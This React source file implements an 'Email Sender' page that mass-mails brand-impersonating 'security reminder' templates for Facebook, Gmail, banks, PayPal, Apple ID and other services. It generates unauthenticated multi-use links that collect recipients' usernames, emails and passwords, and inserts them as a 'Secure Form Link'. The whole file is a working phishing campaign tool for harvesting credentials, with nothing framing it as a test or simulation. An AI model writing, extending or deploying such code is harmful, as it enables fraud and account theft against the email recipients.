'use client';

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/Button';
import { Input } from '@/components/ui/Input';
import { createClient } from '@/lib/supabase/client';
import { Mail, Send, Settings, FileText, Upload, CheckCircle, XCircle, Sparkles, Link as LinkIcon } from 'lucide-react';
import toast from 'react-hot-toast';

interface SMTPSettings {
  id?: string;
  smtp_host: string;
  smtp_port: number;
  smtp_user: string;
  smtp_password: string;
  smtp_from_email: string;
  smtp_from_name: string;
}

interface EmailTemplate {
  id: string;
  template_name: string;
  subject: string;
  body: string;
}

interface Recipient {
  email: string;
  name?: string;
}

// Account types with their email templates
const ACCOUNT_TYPES = [
  { id: 'facebook', name: 'Facebook', icon: '📘', color: 'from-blue-500 to-blue-600' },
  { id: 'gmail', name: 'Gmail / Google', icon: '📧', color: 'from-red-500 to-yellow-500' },
  { id: 'instagram', name: 'Instagram', icon: '📷', color: 'from-purple-500 to-pink-500' },
  { id: 'banking', name: 'Banking', icon: '🏦', color: 'from-green-500 to-emerald-600' },
  { id: 'whatsapp', name: 'WhatsApp', icon: '💬', color: 'from-green-400 to-green-600' },
  { id: 'linkedin', name: 'LinkedIn', icon: '💼', color: 'from-blue-600 to-blue-700' },
  { id: 'twitter', name: 'Twitter / X', icon: '🐦', color: 'from-blue-400 to-blue-500' },
  { id: 'apple', name: 'Apple ID', icon: '🍎', color: 'from-gray-700 to-gray-900' },
  { id: 'microsoft', name: 'Microsoft', icon: '🪟', color: 'from-blue-500 to-cyan-500' },
  { id: 'amazon', name: 'Amazon', icon: '📦', color: 'from-orange-400 to-yellow-500' },
  { id: 'paypal', name: 'PayPal', icon: '💳', color: 'from-blue-600 to-blue-800' },
  { id: 'tiktok', name: 'TikTok', icon: '🎵', color: 'from-black to-pink-600' },
];

export default function EmailSenderPage() {
  const supabase = createClient();
  const [activeTab, setActiveTab] = useState<'smtp' | 'send'>('smtp');
  const [smtpConfigured, setSmtpConfigured] = useState(false);
  
  // SMTP Settings
  const [smtpSettings, setSmtpSettings] = useState<SMTPSettings>({
    smtp_host: '',
    smtp_port: 587,
    smtp_user: '',
    smtp_password: '',
    smtp_from_email: '',
    smtp_from_name: '',
  });

  // Email Sending
  const [selectedAccountType, setSelectedAccountType] = useState('');
  const [emailSubject, setEmailSubject] = useState('');
  const [emailBody, setEmailBody] = useState('');
  const [includeAskUrl, setIncludeAskUrl] = useState(false);
  const [askUrl, setAskUrl] = useState('');
  const [recipients, setRecipients] = useState<Recipient[]>([]);
  const [emailList, setEmailList] = useState('');
  const [loading, setLoading] = useState(false);
  const [sendProgress, setSendProgress] = useState<{ sent: number; failed: number; total: number } | null>(null);

  useEffect(() => {
    loadSMTPSettings();
    loadDefaultTemplates();
  }, []);

  const loadSMTPSettings = async () => {
    try {
      const res = await fetch('/api/smtp/config');
      const result = await res.json();
      if (result.data) {
        setSmtpSettings(result.data);
        setSmtpConfigured(true);
      }
    } catch (error) {
      console.error('Error loading SMTP settings:', error);
    }
  };

  const loadDefaultTemplates = async () => {
    try {
      await fetch('/api/email-templates/defaults', { method: 'POST' });
    } catch (error) {
      console.error('Error loading default templates:', error);
    }
  };

  const saveSMTPSettings = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/smtp/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(smtpSettings),
      });
      const result = await res.json();
      if (res.ok) {
        toast.success('✓ SMTP settings saved successfully!');
        setSmtpConfigured(true);
        setActiveTab('send');
      } else {
        toast.error(result.error || 'Failed to save settings');
      }
    } catch (error) {
      toast.error('Error saving SMTP settings');
    } finally {
      setLoading(false);
    }
  };

  const loadTemplateForAccount = async (accountType: string) => {
    setSelectedAccountType(accountType);
    
    // Template name mapping
    const templateMap: { [key: string]: string } = {
      'facebook': 'Facebook Security Reminder',
      'gmail': 'Gmail Security Reminder',
      'instagram': 'Instagram Security Alert',
      'banking': 'Banking Security Reminder',
      'whatsapp': 'WhatsApp Security Tips',
      'linkedin': 'LinkedIn Security Reminder',
      'twitter': 'Twitter/X Security Alert',
      'apple': 'Apple ID Security Reminder',
      'microsoft': 'Microsoft Account Security',
      'amazon': 'Amazon Account Security',
      'paypal': 'PayPal Security Reminder',
      'tiktok': 'TikTok Security Tips',
    };

    try {
      const res = await fetch('/api/email-templates');
      const result = await res.json();
      if (result.data) {
        const template = result.data.find((t: EmailTemplate) => 
          t.template_name === templateMap[accountType]
        );
        if (template) {
          setEmailSubject(template.subject);
          setEmailBody(template.body);
          toast.success(`✓ ${templateMap[accountType]} loaded!`);
        }
      }
    } catch (error) {
      console.error('Error loading template:', error);
    }
  };

  const generateAskUrl = async () => {
    setLoading(true);
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) {
        toast.error('Please login first');
        return;
      }

      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + 7);

      const { data, error } = await supabase
        .from('collection_links')
        .insert({
          owner_id: user.id,
          link_type: 'multi-use',
          item_type: 'credential',
          allowed_fields: ['username', 'email', 'password', 'website'],
          expires_at: expiresAt.toISOString(),
          max_uses: 100,
          current_uses: 0,
          requires_auth: false,
        })
        .select()
        .single();

      if (error) throw error;

      const url = `${window.location.origin}/collect/${data.id}`;
      setAskUrl(url);
      toast.success('✓ Ask URL generated!');
    } catch (error) {
      console.error('Error generating ask URL:', error);
      toast.error('Failed to generate URL');
    } finally {
      setLoading(false);
    }
  };

  const parseEmailList = (text: string) => {
    const lines = text.split('\n').filter(line => line.trim());
    const parsed: Recipient[] = [];
    
    for (const line of lines) {
      const trimmed = line.trim();
      if (trimmed.includes('<') && trimmed.includes('>')) {
        const nameMatch = trimmed.match(/^(.+?)\s*<(.+?)>$/);
        if (nameMatch) {
          parsed.push({ name: nameMatch[1].trim(), email: nameMatch[2].trim() });
        }
      } else if (trimmed.includes('@')) {
        parsed.push({ email: trimmed });
      }
    }
    
    setRecipients(parsed);
  };

  const sendEmails = async () => {
    if (!smtpConfigured) {
      toast.error('Please configure SMTP settings first');
      setActiveTab('smtp');
      return;
    }

    if (recipients.length === 0) {
      toast.error('Please add recipients');
      return;
    }

    if (!emailSubject || !emailBody) {
      toast.error('Please fill in subject and body');
      return;
    }

    setLoading(true);
    setSendProgress({ sent: 0, failed: 0, total: recipients.length });

    // Prepare email body with ask URL if included
    let finalBody = emailBody;
    if (includeAskUrl && askUrl) {
      finalBody += `\n\n──────────────────────────\n\n`;
      finalBody += `🔐 Secure Form Link:\n${askUrl}\n\n`;
      finalBody += `Click the link above to securely update your information.`;
    }

    try {
      const res = await fetch('/api/email/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          recipients,
          subject: emailSubject,
          emailBody: finalBody,
        }),
      });
      const result = await res.json();
      
      if (res.ok) {
        setSendProgress({ sent: result.sent, failed: result.failed, total: recipients.length });
        toast.success(`✓ Sent ${result.sent} emails successfully!`);
      } else {
        toast.error(result.error || 'Failed to send emails');
      }
    } catch (error) {
      toast.error('Error sending emails');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-6xl mx-auto space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-4xl font-black bg-gradient-to-r from-pink-600 via-purple-600 to-indigo-600 bg-clip-text text-transparent">
            Email Sender
          </h1>
          <p className="text-gray-600 mt-2">Send security reminders to your contacts</p>
        </div>
        {smtpConfigured && (
          <div className="flex items-center gap-2 px-4 py-2 bg-green-50 border border-green-200 rounded-xl">
            <CheckCircle className="text-green-600" size={20} />
            <span className="text-sm font-semibold text-green-700">SMTP Configured</span>
          </div>
        )}
      </div>

      {/* Tabs */}
      <div className="flex gap-2 p-2 bg-white rounded-2xl shadow-lg border border-gray-200">
        <button
          onClick={() => setActiveTab('smtp')}
          className={`flex-1 flex items-center justify-center gap-3 px-6 py-4 rounded-xl font-bold transition-all duration-300 ${
            activeTab === 'smtp'
              ? 'bg-gradient-to-r from-purple-500 to-indigo-500 text-white shadow-lg scale-105'
              : 'text-gray-600 hover:bg-gray-50'
          }`}
        >
          <Settings size={20} />
          <span>SMTP Configuration</span>
        </button>
        <button
          onClick={() => setActiveTab('send')}
          className={`flex-1 flex items-center justify-center gap-3 px-6 py-4 rounded-xl font-bold transition-all duration-300 ${
            activeTab === 'send'
              ? 'bg-gradient-to-r from-pink-500 to-rose-500 text-white shadow-lg scale-105'
              : 'text-gray-600 hover:bg-gray-50'
          }`}
        >
          <Send size={20} />
          <span>Send Emails</span>
        </button>
      </div>

      {/* SMTP Configuration Tab */}
      {activeTab === 'smtp' && (
        <div className="bg-gradient-to-br from-white to-purple-50 p-8 rounded-3xl shadow-xl border-2 border-purple-200">
          <div className="flex items-center gap-3 mb-6">
            <div className="p-3 bg-gradient-to-br from-purple-500 to-indigo-500 rounded-2xl">
              <Settings className="text-white" size={24} />
            </div>
            <div>
              <h2 className="text-2xl font-black text-gray-900">SMTP Server Settings</h2>
              <p className="text-gray-600 text-sm">Configure your email server to send emails</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Host</label>
              <Input
                type="text"
                value={smtpSettings.smtp_host}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_host: e.target.value })}
                placeholder="smtp.gmail.com"
                className="h-12"
              />
            </div>
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Port</label>
              <Input
                type="number"
                value={smtpSettings.smtp_port}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_port: parseInt(e.target.value) })}
                placeholder="587"
                className="h-12"
              />
            </div>
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Username</label>
              <Input
                type="text"
                value={smtpSettings.smtp_user}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_user: e.target.value })}
                placeholder="your-email@gmail.com"
                className="h-12"
              />
            </div>
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">SMTP Password</label>
              <Input
                type="password"
                value={smtpSettings.smtp_password}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_password: e.target.value })}
                placeholder="Your app password"
                className="h-12"
              />
            </div>
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">From Email</label>
              <Input
                type="email"
                value={smtpSettings.smtp_from_email}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_from_email: e.target.value })}
                placeholder="your-email@gmail.com"
                className="h-12"
              />
            </div>
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">From Name</label>
              <Input
                type="text"
                value={smtpSettings.smtp_from_name}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_from_name: e.target.value })}
                placeholder="Your Name"
                className="h-12"
              />
            </div>
          </div>

          <div className="mt-8 p-4 bg-blue-50 border-2 border-blue-200 rounded-2xl">
            <p className="text-sm text-blue-800">
              <strong>💡 Gmail Users:</strong> Use port 587, and generate an "App Password" from your Google Account security settings.
            </p>
          </div>

          <div className="mt-6">
            <Button 
              onClick={saveSMTPSettings} 
              disabled={loading}
              className="w-full h-14 text-lg font-bold bg-gradient-to-r from-purple-500 to-indigo-500 hover:from-purple-600 hover:to-indigo-600"
            >
              {loading ? 'Saving...' : '💾 Save SMTP Settings'}
            </Button>
          </div>
        </div>
      )}

      {/* Send Emails Tab */}
      {activeTab === 'send' && (
        <div className="space-y-6">
          {/* Account Type Selection */}
          <div className="bg-gradient-to-br from-white to-pink-50 p-8 rounded-3xl shadow-xl border-2 border-pink-200">
            <div className="flex items-center gap-3 mb-6">
              <div className="p-3 bg-gradient-to-br from-pink-500 to-rose-500 rounded-2xl">
                <Sparkles className="text-white" size={24} />
              </div>
              <div>
                <h2 className="text-2xl font-black text-gray-900">Select Account Type</h2>
                <p className="text-gray-600 text-sm">Choose a service to load its security reminder template</p>
              </div>
            </div>

            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
              {ACCOUNT_TYPES.map((type) => (
                <button
                  key={type.id}
                  onClick={() => loadTemplateForAccount(type.id)}
                  className={`relative p-6 rounded-2xl border-2 transition-all duration-300 transform hover:scale-105 ${
                    selectedAccountType === type.id
                      ? `bg-gradient-to-br ${type.color} text-white border-white shadow-2xl scale-105`
                      : 'bg-white border-gray-200 hover:border-pink-300 hover:shadow-lg'
                  }`}
                >
                  <div className="text-4xl mb-2">{type.icon}</div>
                  <div className={`text-sm font-bold ${selectedAccountType === type.id ? 'text-white' : 'text-gray-700'}`}>
                    {type.name}
                  </div>
                  {selectedAccountType === type.id && (
                    <div className="absolute top-2 right-2">
                      <CheckCircle className="text-white" size={20} />
                    </div>
                  )}
                </button>
              ))}
            </div>
          </div>

          {/* Email Content */}
          {selectedAccountType && (
            <>
              <div className="bg-gradient-to-br from-white to-indigo-50 p-8 rounded-3xl shadow-xl border-2 border-indigo-200">
                <div className="flex items-center gap-3 mb-6">
                  <div className="p-3 bg-gradient-to-br from-indigo-500 to-purple-500 rounded-2xl">
                    <FileText className="text-white" size={24} />
                  </div>
                  <div>
                    <h2 className="text-2xl font-black text-gray-900">Email Content</h2>
                    <p className="text-gray-600 text-sm">Customize your email message</p>
                  </div>
                </div>

                <div className="space-y-6">
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">Email Subject</label>
                    <Input
                      type="text"
                      value={emailSubject}
                      onChange={(e) => setEmailSubject(e.target.value)}
                      placeholder="Email subject"
                      className="h-12 text-lg"
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">Email Body</label>
                    <textarea
                      value={emailBody}
                      onChange={(e) => setEmailBody(e.target.value)}
                      className="w-full p-4 border-2 border-gray-300 rounded-2xl focus:ring-4 focus:ring-indigo-500 focus:border-indigo-500 min-h-[300px] text-base"
                      placeholder="Your email content here..."
                    />
                    <p className="text-sm text-gray-500 mt-2">
                      💡 Use {'{name}'} to personalize with recipient names
                    </p>
                  </div>

                  {/* Ask URL Option */}
                  <div className="p-6 bg-gradient-to-br from-purple-50 to-pink-50 border-2 border-purple-200 rounded-2xl">
                    <div className="flex items-start gap-4">
                      <input
                        type="checkbox"
                        checked={includeAskUrl}
                        onChange={(e) => setIncludeAskUrl(e.target.checked)}
                        className="mt-1 w-5 h-5 text-purple-600 rounded"
                      />
                      <div className="flex-1">
                        <label className="text-base font-bold text-gray-900 cursor-pointer">
                          Include Secure Collection Link
                        </label>
                        <p className="text-sm text-gray-600 mt-1">
                          Automatically generate and include a secure link where recipients can submit their credentials
                        </p>
                        
                        {includeAskUrl && (
                          <div className="mt-4 space-y-3">
                            {!askUrl ? (
                              <Button
                                onClick={generateAskUrl}
                                disabled={loading}
                                variant="secondary"
                                className="bg-gradient-to-r from-purple-500 to-pink-500 text-white hover:from-purple-600 hover:to-pink-600"
                              >
                                <LinkIcon size={18} className="mr-2" />
                                {loading ? 'Generating...' : 'Generate Collection Link'}
                              </Button>
                            ) : (
                              <div className="p-4 bg-white border-2 border-purple-300 rounded-xl">
                                <div className="text-xs font-bold text-gray-600 mb-2">GENERATED LINK:</div>
                                <div className="text-sm font-mono text-purple-700 break-all">{askUrl}</div>
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Recipients */}
              <div className="bg-gradient-to-br from-white to-green-50 p-8 rounded-3xl shadow-xl border-2 border-green-200">
                <div className="flex items-center gap-3 mb-6">
                  <div className="p-3 bg-gradient-to-br from-green-500 to-emerald-500 rounded-2xl">
                    <Upload className="text-white" size={24} />
                  </div>
                  <div>
                    <h2 className="text-2xl font-black text-gray-900">Email Recipients</h2>
                    <p className="text-gray-600 text-sm">Add your contact list</p>
                  </div>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-bold text-gray-700 mb-2">
                      Email List (one per line)
                    </label>
                    <textarea
                      value={emailList}
                      onChange={(e) => {
                        setEmailList(e.target.value);
                        parseEmailList(e.target.value);
                      }}
                      className="w-full p-4 border-2 border-gray-300 rounded-2xl focus:ring-4 focus:ring-green-500 focus:border-green-500 font-mono text-sm min-h-[150px]"
                      placeholder="john@example.com&#10;Jane Doe <jane@example.com>&#10;bob@example.com"
                    />
                  </div>

                  {recipients.length > 0 && (
                    <div className="p-6 bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-300 rounded-2xl">
                      <div className="flex items-center gap-2 mb-3">
                        <CheckCircle className="text-green-600" size={20} />
                        <span className="font-bold text-green-700">
                          {recipients.length} Recipients Ready
                        </span>
                      </div>
                      <div className="space-y-2 max-h-40 overflow-y-auto">
                        {recipients.slice(0, 10).map((r, i) => (
                          <div key={i} className="text-sm text-gray-700 flex items-center gap-2">
                            <Mail size={14} className="text-green-600" />
                            {r.name ? `${r.name} (${r.email})` : r.email}
                          </div>
                        ))}
                        {recipients.length > 10 && (
                          <p className="text-sm text-gray-500 font-semibold">
                            ...and {recipients.length - 10} more
                          </p>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Send Progress */}
              {sendProgress && (
                <div className="bg-white p-6 rounded-3xl shadow-xl border-2 border-gray-200">
                  <h3 className="text-lg font-black text-gray-900 mb-4">📊 Sending Progress</h3>
                  <div className="space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className="font-semibold">Total: {sendProgress.total}</span>
                      <span className="text-green-600 font-bold">✓ Sent: {sendProgress.sent}</span>
                      <span className="text-red-600 font-bold">✗ Failed: {sendProgress.failed}</span>
                    </div>
                    <div className="w-full bg-gray-200 rounded-full h-6 overflow-hidden">
                      <div
                        className="bg-gradient-to-r from-green-500 to-emerald-500 h-6 rounded-full transition-all duration-500 flex items-center justify-center text-white text-xs font-bold"
                        style={{ width: `${((sendProgress.sent + sendProgress.failed) / sendProgress.total) * 100}%` }}
                      >
                        {Math.round(((sendProgress.sent + sendProgress.failed) / sendProgress.total) * 100)}%
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Send Button */}
              <div className="sticky bottom-6">
                <Button
                  onClick={sendEmails}
                  disabled={loading || recipients.length === 0 || !smtpConfigured}
                  className="w-full h-16 text-xl font-black bg-gradient-to-r from-pink-500 via-rose-500 to-red-500 hover:from-pink-600 hover:via-rose-600 hover:to-red-600 shadow-2xl"
                >
                  {loading ? (
                    '⏳ Sending Emails...'
                  ) : (
                    <>
                      <Send size={24} className="mr-3" />
                      Send to {recipients.length} Recipients
                    </>
                  )}
                </Button>
              </div>
            </>
          )}

          {!selectedAccountType && (
            <div className="text-center py-20">
              <div className="text-6xl mb-4">📧</div>
              <h3 className="text-2xl font-black text-gray-400">Select an account type above to get started</h3>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
